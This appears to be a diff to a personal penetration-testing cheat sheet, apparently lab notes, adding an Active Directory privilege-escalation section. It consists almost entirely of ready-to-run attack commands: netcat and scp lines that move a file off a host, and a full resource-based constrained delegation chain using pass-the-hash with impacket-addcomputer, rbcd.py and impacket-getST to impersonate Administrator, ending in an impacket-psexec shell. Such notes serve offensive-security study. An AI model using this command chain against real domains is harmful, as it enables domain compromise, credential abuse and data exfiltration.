@@ -794,3 +794,14 @@ nc 192.168.45.176 4444 < local.txt
 scp stuart@192.168.234.144:/home/stuart/local.txt stuart_local.txt
 nc -nvlp 4444 > local.txt
 ```
+
+# Active Directory Privilege
+
+## GenericAll on a computer
+```bash
+impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
+python3 rbcd.py -dc-ip 192.168.x.x -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
+impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x
+export KRB5CCNAME=./Administrator.ccache
+impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
+```
